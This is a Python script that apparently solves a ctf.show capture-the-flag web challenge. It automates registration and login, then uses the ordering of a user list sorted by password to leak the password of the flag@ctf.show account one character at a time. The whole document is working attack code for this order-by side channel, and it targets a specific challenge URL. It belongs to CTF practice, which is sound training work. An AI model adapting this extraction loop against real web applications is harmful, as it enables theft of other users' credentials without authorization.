import requests
url="http://ee703772-1852-406d-80de-7dc36e5d0c63.challenge.ctf.show:8080"
url1=url+"/reg.php" #注册页面
url2=url+"/login.php"#登录界面
url3=url+"/user_main.php?order=pwd" #查询界面
k=""
s="-.0123456789:abcdefghijklmnopqrstuvwxyz{|}~"
for j in range(0,45):
    print(j+1)
    for i in s:
        #print(i)
        l=""
        l=k+i
        l2 = k+chr(ord(i)-1)
        data={'username':l,
                    'email':'c',
                    'nickname':'c',
                    'password':l
        }
        data2={'username':l,
                      'password':l
        }
        if (l=='flag'):
            k='flag'
            print(k)
            break
        session = requests.session()
        r1 = session.post(url1,data)
        r2 = session.post(url2,data2)
        r3 = session.get(url3)
        t = r3.text
        #print(l)
        try:
            if (t.index("<td>"+l+"</td>")>t.index("<td>flag@ctf.show</td>")):
                k=l2
                print(k)
                break
        except:
            pass

